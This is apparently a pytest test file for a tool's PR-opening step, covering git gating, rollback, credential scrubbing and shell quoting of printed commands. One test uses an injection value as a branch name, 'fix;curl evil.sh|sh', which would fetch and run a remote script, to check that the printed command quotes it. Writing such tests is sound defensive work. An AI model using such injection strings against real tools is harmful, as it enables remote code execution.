import shlex
import subprocess
from pathlib import Path

import pytest

from mylonite.gate.pr import GatePaths, GatePrError, PrResult, open_or_print_pr, resolve_repo_root


def _make_artifacts(tmp_path: Path) -> GatePaths:
    gate_dir = tmp_path / ".mylonite" / "gate"
    gate_dir.mkdir(parents=True)
    (gate_dir / "test_security_x.py").write_text("# test\n", encoding="utf-8")
    (gate_dir / "exploit_x.json").write_text("{}", encoding="utf-8")
    wf = tmp_path / ".github" / "workflows"
    wf.mkdir(parents=True)
    (wf / "mylonite-gate.yml").write_text("name: gate\n", encoding="utf-8")
    return GatePaths(
        repo_root=tmp_path,
        gate_dir=gate_dir,
        add_paths=[gate_dir],
        workflow_files=[wf / "mylonite-gate.yml"],
    )


def _fake_runner_recording():
    calls = []

    def run(cmd, **kwargs):
        calls.append(list(cmd))

        class _CP:  # completed-process-ish
            returncode = 0
            stdout = ""
            stderr = ""

        return _CP()

    run.calls = calls  # type: ignore[attr-defined]
    return run


def test_print_path_when_open_pr_false(tmp_path, capsys):
    paths = _make_artifacts(tmp_path)
    runner = _fake_runner_recording()
    result = open_or_print_pr(
        paths,
        branch="mylonite/gate-x",
        pr_title="Gate: x",
        pr_body="body",
        open_pr=False,
        base="main",
        _run=runner,
    )
    assert isinstance(result, PrResult)
    assert result.opened is False
    out = capsys.readouterr().out
    assert "mylonite/gate-x" in out
    assert "gh pr create" in out  # prints the exact command to run by hand
    assert result.printed_command is not None
    assert not any(c[:2] == ["git", "push"] for c in runner.calls)
    assert not any(c[:1] == ["gh"] for c in runner.calls)


def test_no_git_mutation_at_all_without_open_pr(tmp_path, capsys):
    """Without --open-pr, `gate` must not touch the operator's repository.

    The commit sequence used to run BEFORE the `if not open_pr` check, so a user
    running plain `mylonite gate` to see what it finds got a new branch and a
    commit they never asked for. Committing is part of the PR flow; it is gated
    on the flag that requests the PR flow.
    """
    paths = _make_artifacts(tmp_path)
    runner = _fake_runner_recording()

    result = open_or_print_pr(
        paths,
        branch="mylonite/gate-x",
        pr_title="Gate: x",
        pr_body="body",
        open_pr=False,
        base="main",
        _run=runner,
    )

    assert result.opened is False
    # NOTHING ran. Not rev-parse, not checkout, not add, not commit.
    assert runner.calls == [], f"expected zero git subprocesses; got {runner.calls}"
    # ...and the operator is told exactly how to do it by hand instead.
    printed = result.printed_command or ""
    assert "git checkout -b" in printed
    assert "git add" in printed
    assert "git commit" in printed
    assert "gh pr create" in printed


def test_print_path_warns_against_git_add_on_the_bare_gate_dir(tmp_path, capsys):
    """The gate output directory can still hold artefacts from an earlier
    run (a rejected finding's leftovers live in a SIBLING directory, but a
    prior KEPT finding's own subdirectory is still right there) -- so the
    printed next-steps text must tell the operator to stage with the
    printed `git add` command, not a bare `git add <out>` of their own."""
    paths = _make_artifacts(tmp_path)
    result = open_or_print_pr(
        paths,
        branch="mylonite/gate-x",
        pr_title="Gate: x",
        pr_body="body",
        open_pr=False,
        base="main",
        _run=_fake_runner_recording(),
    )
    out = capsys.readouterr().out
    assert result.printed_command is not None
    add_line = next(line for line in result.printed_command.splitlines() if "git add" in line)
    # The copy-pasteable command names the explicit paths, never the bare dir.
    assert add_line.strip() != f"git add {paths.gate_dir}"
    # And the surrounding prose says so outright, not just by implication.
    assert "not `git add" in out
    assert str(paths.gate_dir) in out


def test_print_path_lists_workflow_files_already_written(tmp_path, capsys):
    """`--workflows` writes `.github/workflows/*` to disk unconditionally -- even
    without `--open-pr`. The printed summary must say so and name the file(s),
    not claim the repository was not modified when it was."""
    paths = _make_artifacts(tmp_path)  # workflow_files is non-empty
    open_or_print_pr(
        paths,
        branch="mylonite/gate-x",
        pr_title="Gate: x",
        pr_body="body",
        open_pr=False,
        base="main",
        _run=_fake_runner_recording(),
    )
    out = capsys.readouterr().out
    assert "Your repository was not modified" not in out
    assert "mylonite-gate.yml" in out
    assert "Nothing else in your repository was modified" in out


def test_print_path_says_not_modified_when_no_workflows_were_written(tmp_path, capsys):
    """Without `--workflows`, `workflow_files` is empty and the stronger claim holds."""
    paths = _make_artifacts(tmp_path)
    paths = GatePaths(
        repo_root=paths.repo_root,
        gate_dir=paths.gate_dir,
        add_paths=paths.add_paths,
        workflow_files=[],
    )
    open_or_print_pr(
        paths,
        branch="mylonite/gate-x",
        pr_title="Gate: x",
        pr_body="body",
        open_pr=False,
        base="main",
        _run=_fake_runner_recording(),
    )
    out = capsys.readouterr().out
    assert "Your repository was not modified" in out
    assert "mylonite-gate.yml" not in out


def test_gate_paths_add_paths_is_required(tmp_path) -> None:
    """`add_paths` names exactly what `git add` stages; there is no directory-
    sweep fallback for a caller that omits it -- the sole production caller
    (`gate/wiring.py`'s `open_pr_fn`) always builds this list explicitly, so
    an omitted `add_paths` is a caller bug, not a valid "sweep everything"
    request."""
    with pytest.raises(TypeError):
        GatePaths(repo_root=tmp_path, gate_dir=tmp_path / ".mylonite" / "gate")  # type: ignore[call-arg]


def test_open_pr_still_commits(tmp_path, monkeypatch):
    """The commit sequence still runs when the operator asks for the PR flow."""
    import mylonite.gate.pr as prmod

    monkeypatch.setattr(prmod.shutil, "which", lambda _: "/usr/bin/gh")
    paths = _make_artifacts(tmp_path)
    runner = _fake_runner_recording()

    open_or_print_pr(
        paths,
        branch="mylonite/gate-x",
        pr_title="Gate: x",
        pr_body="body",
        open_pr=True,
        base="main",
        _run=runner,
    )

    assert ["git", "checkout", "-b", "mylonite/gate-x"] in runner.calls
    assert any(c[:2] == ["git", "add"] for c in runner.calls)
    assert ["git", "commit", "-m", "Gate: x"] in runner.calls


def test_open_path_calls_gh_when_available(tmp_path, monkeypatch):
    import mylonite.gate.pr as prmod

    monkeypatch.setattr(prmod.shutil, "which", lambda _: "/usr/bin/gh")
    paths = _make_artifacts(tmp_path)
    cmds = []

    def run(cmd, **kwargs):
        cmds.append(list(cmd))

        class _CP:
            returncode = 0
            # gh auth status -> ok; gh pr create -> prints URL
            stdout = "https://github.com/o/r/pull/1\n" if cmd[:3] == ["gh", "pr", "create"] else ""
            stderr = ""

        return _CP()

    result = open_or_print_pr(
        paths,
        branch="mylonite/gate-x",
        pr_title="Gate: x",
        pr_body="body",
        open_pr=True,
        base="main",
        _run=run,
    )
    assert result.opened is True
    assert result.pr_url == "https://github.com/o/r/pull/1"
    assert ["git", "push", "-u", "origin", "mylonite/gate-x"] in cmds
    assert any(c[:3] == ["gh", "pr", "create"] for c in cmds)


def test_open_requested_but_gh_missing_degrades_to_print(tmp_path, capsys, monkeypatch):
    import mylonite.gate.pr as prmod

    monkeypatch.setattr(prmod.shutil, "which", lambda _: None)  # gh not installed
    paths = _make_artifacts(tmp_path)
    result = open_or_print_pr(
        paths,
        branch="mylonite/gate-x",
        pr_title="Gate: x",
        pr_body="body",
        open_pr=True,
        base="main",
        _run=_fake_runner_recording(),
    )
    assert result.opened is False
    assert "gh pr create" in capsys.readouterr().out


def test_relative_gate_dir_does_not_crash(tmp_path, monkeypatch):
    """A RELATIVE gate_dir (the CLI default '--out .mylonite/gate') must not raise ValueError.

    Before the fix, Path(".mylonite/gate").relative_to(tmp_path) raised ValueError because
    you cannot call relative_to() on a relative path against an absolute one.
    """
    import mylonite.gate.pr as prmod

    monkeypatch.chdir(tmp_path)
    monkeypatch.setattr(prmod.shutil, "which", lambda _: None)  # stop after the commit
    gate_dir = tmp_path / ".mylonite" / "gate"
    gate_dir.mkdir(parents=True)
    (gate_dir / "test_security_x.py").write_text("# t\n", encoding="utf-8")

    from pathlib import Path as _P

    # gate_dir is deliberately RELATIVE — mirrors the real CLI default
    rel_gate_dir = _P(".mylonite/gate")
    paths = GatePaths(
        repo_root=tmp_path, gate_dir=rel_gate_dir, add_paths=[rel_gate_dir], workflow_files=[]
    )
    runner = _fake_runner_recording()
    result = open_or_print_pr(
        paths,
        branch="b",
        pr_title="t",
        pr_body="x",
        open_pr=True,  # the commit sequence only runs under the PR flow
        base="main",
        _run=runner,
    )
    assert result.opened is False
    # The relative path must have reached git add without crashing
    git_add_calls = [c for c in runner.calls if c[:2] == ["git", "add"]]
    assert git_add_calls, "expected at least one git add call"
    added_args = " ".join(str(a) for a in git_add_calls[0])
    assert ".mylonite" in added_args, f"expected .mylonite in git add args; got: {git_add_calls[0]}"


def test_failing_git_commit_raises(tmp_path):
    paths = _make_artifacts(tmp_path)

    def run(cmd, **kwargs):
        class _CP:
            returncode = 1 if cmd[:2] == ["git", "commit"] else 0
            stdout = ""
            stderr = "nothing to commit"

        return _CP()

    with pytest.raises(GatePrError):
        open_or_print_pr(
            paths, branch="b", pr_title="t", pr_body="x", open_pr=True, base="main", _run=run
        )


def test_printed_command_quotes_every_interpolated_value(tmp_path):
    """DCR-0018: only pr_title was shlex.quote()d, so a branch named
    `fix;curl evil.sh|sh` — a valid git ref — executed when the operator
    copy-pasted the printed command, per the documented workflow.
    """
    paths = _make_artifacts(tmp_path)
    runner = _fake_runner_recording()
    branch = "fix;curl evil.sh|sh"

    result = open_or_print_pr(
        paths,
        branch=branch,
        pr_title="Gate: x",
        pr_body="body",
        open_pr=False,
        base="main",
        _run=runner,
    )

    assert result.printed_command is not None
    # the OLD, unquoted interpolation site must be gone...
    assert f"--head {branch}" not in result.printed_command
    # ...replaced by the branch as a single, safely-quoted shell token, so a
    # copy-pasted `curl` never becomes its own command.
    assert f"--head {shlex.quote(branch)}" in result.printed_command
    assert shlex.quote(branch) in result.printed_command


def test_failed_commit_restores_the_original_branch(tmp_path):
    """DCR-0017: a failure after `checkout -b` left the repo on a half-created
    branch, and the deterministic branch name blocked every retry.
    """
    paths = _make_artifacts(tmp_path)
    calls = []

    def run(cmd, **kwargs):
        calls.append(list(cmd))

        class _CP:
            returncode = 1 if cmd[:2] == ["git", "commit"] else 0
            stdout = "main\n" if cmd[:3] == ["git", "rev-parse", "--abbrev-ref"] else ""
            stderr = "nothing to commit" if cmd[:2] == ["git", "commit"] else ""

        return _CP()

    with pytest.raises(GatePrError):
        open_or_print_pr(
            paths,
            branch="mylonite/gate-fail",
            pr_title="t",
            pr_body="x",
            open_pr=True,
            base="main",
            _run=run,
        )

    # the repo must end up back on the branch it started on...
    assert ["git", "checkout", "main"] in calls
    # ...and the half-created branch must be deleted so a retry with the same
    # deterministic branch name doesn't immediately fail on "branch exists".
    assert ["git", "branch", "-D", "mylonite/gate-fail"] in calls
    # rollback must happen AFTER the failing commit attempt, not before
    commit_idx = calls.index(["git", "commit", "-m", "t"])
    restore_idx = calls.index(["git", "checkout", "main"])
    assert restore_idx > commit_idx


def test_out_of_tree_gate_dir_raises_GatePrError_before_any_checkout(tmp_path):
    """DCR-0016: relative_to() raised a bare ValueError AFTER the branch switch."""
    repo_root = tmp_path / "repo"
    repo_root.mkdir()
    outside_dir = tmp_path / "outside" / "gate"
    outside_dir.mkdir(parents=True)
    (outside_dir / "test_security_x.py").write_text("# t\n", encoding="utf-8")
    paths = GatePaths(
        repo_root=repo_root, gate_dir=outside_dir, add_paths=[outside_dir], workflow_files=[]
    )
    runner = _fake_runner_recording()

    with pytest.raises(GatePrError):
        open_or_print_pr(
            paths,
            branch="b",
            pr_title="t",
            pr_body="x",
            open_pr=False,
            base="main",
            _run=runner,
        )

    # nothing destructive (or otherwise) ran — the bad path is caught before
    # any git subprocess, let alone `checkout -b`.
    assert runner.calls == []


def test_git_stderr_credentials_are_scrubbed(tmp_path, monkeypatch):
    """DCR-0019: a credentialed remote URL in git's stderr was embedded verbatim."""
    import mylonite.gate.pr as prmod

    monkeypatch.setattr(prmod.shutil, "which", lambda _: "/usr/bin/gh")
    paths = _make_artifacts(tmp_path)
    credential = "hunter2verylongtoken1234"

    def run(cmd, **kwargs):
        class _CP:
            returncode = 1 if cmd[:2] == ["git", "push"] else 0
            stdout = "main\n" if cmd[:3] == ["git", "rev-parse", "--abbrev-ref"] else ""
            stderr = (
                f"fatal: unable to access "
                f"'https://octocat:{credential}@github.com/o/r.git/': "
                f"The requested URL returned error: 403"
                if cmd[:2] == ["git", "push"]
                else ""
            )

        return _CP()

    with pytest.raises(GatePrError) as excinfo:
        open_or_print_pr(
            paths,
            branch="mylonite/gate-x",
            pr_title="t",
            pr_body="x",
            open_pr=True,
            base="main",
            _run=run,
        )

    message = str(excinfo.value)
    assert credential not in message
    assert "github.com" in message  # host stays legible


def test_rollback_step_failure_warns_but_does_not_replace_the_original_error(tmp_path, capsys):
    """A failed rollback (e.g. `git checkout` blocked by a dirty tree) must not be
    silently swallowed — it must warn, and it must never mask or replace the
    ORIGINAL GatePrError that triggered the rollback in the first place.
    """
    paths = _make_artifacts(tmp_path)

    def run(cmd, **kwargs):
        class _CP:
            if cmd[:2] == ["git", "commit"]:
                returncode = 1
                stdout = ""
                stderr = "nothing to commit"
            elif cmd[:2] == ["git", "checkout"] and cmd[2] == "main":
                # the rollback's checkout-back step itself fails
                returncode = 1
                stdout = ""
                stderr = "error: Your local changes would be overwritten by checkout"
            else:
                returncode = 0
                stdout = "main\n" if cmd[:3] == ["git", "rev-parse", "--abbrev-ref"] else ""
                stderr = ""

        return _CP()

    with pytest.raises(GatePrError) as excinfo:
        open_or_print_pr(
            paths,
            branch="mylonite/gate-fail",
            pr_title="t",
            pr_body="x",
            open_pr=True,
            base="main",
            _run=run,
        )

    # the ORIGINAL commit failure is still what's raised, not a rollback error
    assert "commit" in str(excinfo.value)
    assert "nothing to commit" in str(excinfo.value)

    # ...but the operator sees a warning that the repo may be half-rolled-back
    err = capsys.readouterr().err
    assert "rollback" in err.lower()
    assert "mylonite/gate-fail" in err
    assert "Your local changes would be overwritten" in err


# ---------------------------------------------------------------------------
# #203: resolve_repo_root
# ---------------------------------------------------------------------------


def _git_init(repo: Path) -> None:
    subprocess.run(["git", "init", str(repo)], check=True, capture_output=True)


def test_resolve_repo_root_from_a_subdirectory_returns_the_top_level(tmp_path):
    """`gate --open-pr` run from a subdirectory must anchor at the repo root,
    not the subdirectory it happened to be invoked from (#203)."""
    _git_init(tmp_path)
    subdir = tmp_path / "sub" / "dir"
    subdir.mkdir(parents=True)

    root = resolve_repo_root(cwd=subdir)

    assert root.resolve() == tmp_path.resolve()


def test_resolve_repo_root_at_the_top_level_is_a_no_op(tmp_path):
    _git_init(tmp_path)
    assert resolve_repo_root(cwd=tmp_path).resolve() == tmp_path.resolve()


def test_resolve_repo_root_outside_a_git_repo_raises_named_error(tmp_path):
    """Outside a git repository entirely: a named GatePrError, not a bare
    subprocess/CalledProcessError or a silent wrong-directory write."""
    outside = tmp_path / "not-a-repo"
    outside.mkdir()

    with pytest.raises(GatePrError, match="not inside a git repository"):
        resolve_repo_root(cwd=outside)


# ---------------------------------------------------------------------------
# git add must only ever touch an explicit, named list of paths — never a
# whole-directory sweep — and PR_BODY.md is always among them.
# ---------------------------------------------------------------------------


def test_add_paths_used_exactly_excludes_anything_not_listed(tmp_path, capsys):
    """When ``add_paths`` is given, `git add`/the printed manual
    command reference EXACTLY those paths -- not the whole gate_dir, which
    would have swept in a sibling 'rejected/' directory too."""
    gate_dir = tmp_path / ".mylonite" / "gate"
    kept_dir = gate_dir / "b_pattern"
    kept_dir.mkdir(parents=True)
    (kept_dir / "test_security_b.py").write_text("# test\n", encoding="utf-8")
    rejected_dir = gate_dir / "rejected" / "a_pattern"
    rejected_dir.mkdir(parents=True)
    (rejected_dir / "test_security_a.py").write_text("# test\n", encoding="utf-8")
    body = gate_dir / "PR_BODY.md"

    paths = GatePaths(
        repo_root=tmp_path,
        gate_dir=gate_dir,
        add_paths=[kept_dir, body],
    )
    runner = _fake_runner_recording()
    result = open_or_print_pr(
        paths, branch="b", pr_title="t", pr_body="x", open_pr=False, base="main", _run=runner
    )
    printed = result.printed_command or ""
    assert "b_pattern" in printed
    assert "rejected" not in printed
    assert "PR_BODY.md" in printed


def test_pr_body_written_before_any_git_command(tmp_path, monkeypatch):
    """PR_BODY.md must exist on disk before `git add` runs -- an add_paths
    list that names it explicitly fails outright on a missing pathspec,
    unlike the old directory-wide `git add gate_dir` sweep, which tolerated
    the file not existing yet."""
    import mylonite.gate.pr as prmod

    monkeypatch.setattr(prmod.shutil, "which", lambda _: None)  # gh not installed
    gate_dir = tmp_path / ".mylonite" / "gate"
    gate_dir.mkdir(parents=True)
    calls_before_write: list[bool] = []

    def run(cmd, **kwargs):
        if cmd[:2] == ["git", "add"]:
            calls_before_write.append((gate_dir / "PR_BODY.md").is_file())

        class _CP:
            returncode = 0
            stdout = "main\n" if cmd[:3] == ["git", "rev-parse", "--abbrev-ref"] else ""
            stderr = ""

        return _CP()

    paths = GatePaths(repo_root=tmp_path, gate_dir=gate_dir, add_paths=[gate_dir / "PR_BODY.md"])
    open_or_print_pr(
        paths, branch="b", pr_title="t", pr_body="hello", open_pr=True, base="main", _run=run
    )

    assert (gate_dir / "PR_BODY.md").read_text(encoding="utf-8") == "hello"
    assert calls_before_write == [True]
